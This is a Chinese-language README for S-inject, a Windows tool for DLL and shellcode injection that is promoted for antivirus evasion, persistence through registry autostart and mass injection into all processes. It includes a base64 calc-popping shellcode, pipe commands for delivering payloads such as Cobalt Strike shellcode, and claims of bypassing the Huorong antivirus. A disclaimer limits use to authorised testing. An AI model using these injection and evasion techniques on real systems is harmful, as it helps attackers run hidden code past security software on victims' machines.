![](https://img.shields.io/badge/joe1sn-S_inject-green)  ![](https://img.shields.io/badge/windows-C++-yellow)

<h1><p align="center">S-inject</p></h1>

<p align="center">DLL+Shellcode的Windows注入免杀工具</p>

<p align="center"><img src="./README.assets/image-20240205141410967.png"></p>

只是罗列各种方法，免杀推荐搭配其他技巧，要具体灵活使用

**须知：**

1. 反射式注入参考了著名github项目：https://github.com/stephenfewer/ReflectiveDLLInjection
   该项目为反射式注入支持的DLL
2. Shellcode使用base64编码后的shellcode
3. 相关测试的DLL文件在`Test Files`文件夹中

**免责声明：** 本工具仅供教育和授权测试目的使用。开发者及贡献者不支持、不鼓励也不赞成任何非法或未经授权的使用。 用户有责任确保其使用本工具的行为符合所有适用的法律法规。严禁将本工具用于任何未经授权的活动。 开发者及贡献者对使用本工具造成的任何损害或后果不承担责任。使用前请自行承担风险。 通过使用本工具，您同意这些条款，并对您的行为承担全部责任。

# Update

- **[2024-3-8]** 更新64位`CreateRemoteThread`为直接系统调用，方法采用`SysWisper3`项目
- **[2024-4-1]** 更新DLL的暴力注入，详细见readme->使用->DLL自动注入/暴力注入
- **[2024-5-16]** 更新远程线程注入，让取消DLL注入更加便捷，便于第二次注入

# 免杀效果

远程shellcode注入等功能可免杀火绒，VNC无感，可注册表添加开机自启动

![image-20240216112653373](./README.assets/image-20240216112653373.png)

![image-20240216113029381](./README.assets/image-20240216113029381.png)

![image-20240216113432922](./README.assets/image-20240216113432922.png)

![image-20240216113917066](./README.assets/image-20240216113917066.png)

# 支持功能

![image-20240205124826998](./README.assets/image-20240205124826998.png)

**DLL注入**

- 远程线程注入
- 反射式注入
- APC调度注入

**Shellcode注入**

- 远程线程注入
- APC调度注入
- Context上下文注入

**可注入进程遍历**

# 使用

非交互式终端使用管道传参

- 注意cmd和powershell的区别
- 注意cmd字符串超过80个会自动换行，推荐搭配powershell

## 一般步骤

1. 运行程序
2. 输入7，遍历出能被注入的进程的pid
3. 选择你的注入方式

## DLL自动注入/遍历注入

- 自动注入

  DLL注入的功能中输入让`pid=0`，如果遇到一个能够被注入的进程那么就会注入，成功注入可能性低

  ![image-20240401105145205](./README.assets/image-20240401105145205.png)

- 暴力注入- **可能对系统造成损害**

  `S-inject.exe <任意值>`，确保启动参数`argc`等于2

  DLL注入的功能中输入让`pid=0`

  程序遍历所有可被注入程序，对每一个能被注入的进程进行DLL注入

  ![image-20240401105329537](./README.assets/image-20240401105329537.png)

## Shellcode注入

这里以64为windows10版本Calc shellcode位例子(虽然会崩溃)
shellcode来源：https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode
base64编码后shellcode

```c
SDH/SPfnZUiLWGBIi1sYSItbIEiLG0iLG0iLWyBJidiLWzxMAcNIMclmgcH/iEjB6QiLFAtMAcJNMdJEi1IcTQHCTTHbRItaIE0Bw00x5ESLYiRNAcTrMltZSDHASIniUUiLDCRIMf9BizyDTAHHSInW86Z0BUj/wOvmWWZBiwREQYsEgkwBwFPDSDHJgMEHSLgPqJaRuoeanEj30EjB6AhQUeiw////SYnGSDHJSPfhUEi4nJ6TnNGah5pI99BQSInhSP/CSIPsIEH/1g==
```

![image-20240205135709302](./README.assets/image-20240205135709302.png)

以CobaltStrike Shellcode为例子

![image-20240205140305351](./README.assets/image-20240205140305351.png)

### 关于使用不可交互终端

可以参考 DLL注入：B, 不可交互终端 部分，尝试利用管道加载

```powershell
#cmd
(echo <option> <base64 Shellcode>) | <S-inject Path>

#powershell
echo "<option index>`n`<pid>`n`<base64 Shellcode>" | <S-inject Path>

#(echo 4`n`16900`n`SDH/SPfnZUiLWGBIi1sYSItbIEiLG0iLG0iLWyBJidiLWzxMAcNIMclmgcH/iEjB6QiLFAtMAcJNMdJEi1IcTQHCTTHbRItaIE0Bw00x5ESLYiRNAcTrMltZSDHASIniUUiLDCRIMf9BizyDTAHHSInW86Z0BUj/wOvmWWZBiwREQYsEgkwBwFPDSDHJgMEHSLgPqJaRuoeanEj30EjB6AhQUeiw////SYnGSDHJSPfhUEi4nJ6TnNGah5pI99BQSInhSP/CSIPsIEH/1g==) |  D:\Github\S-inject\x64\Release\S-inject.exe
```

![image-20240205140815069](./README.assets/image-20240205140815069.png)

## DLL注入

### A, 可交互终端

直接在终端中启动，根据菜单选择功能即可，如枚举可注入进程

![image-20240205125036362](./README.assets/image-20240205125036362.png)

### B, 不可交互终端

因为作者不想增加代码量，单独增添没有必要的参数功能，可以利用管道解决该问题
以下示例使用的注入对象更新前的为`x32dbg`和`x64dbg`，因为一个软件有两个位数的版本，在`x96dbg`中可以选择位数，便于测试

**如远程线程DLL注入**

x64

- powershell

  ```powershell
  echo "<option index>`n`<DLL Path>`n`<PID>" | <S-inject Path>
  
  #echo "1`n`D:\Github\S-inject\Test Files\TestDll_x64.dll`n`20176" | D:\Github\S-inject\x64\Release\S-inject.exe
  ```

  ![image-20240205131438254](./README.assets/image-20240205131438254.png)

- cmd

  推荐使用powershell启动

  ```powershell
  powershell -c echo "<option index>`n`<DLL Path>`n`<PID>" | <S-inject Path>
  
  #powershell -c echo "1`n`D:\Github\S-inject\Test Files\TestDll_x64.dll`n`20176" | D:\Github\S-inject\x64\Release\S-inject.exe
  ```

  ![image-20240205131316348](./README.assets/image-20240205131316348.png)

  cmd.exe

  ```
  (echo <option> <DLL Path> &echo <PID>) | <S-inject Path>
  
  #(echo 1 D:\Github\S-inject\Test Files\TestDll_x64.dll &echo 22268) | D:\Github\S-inject\x64\Release\S-inject.exe
  ```

  ![image-20240205135210534](./README.assets/image-20240205135210534.png)









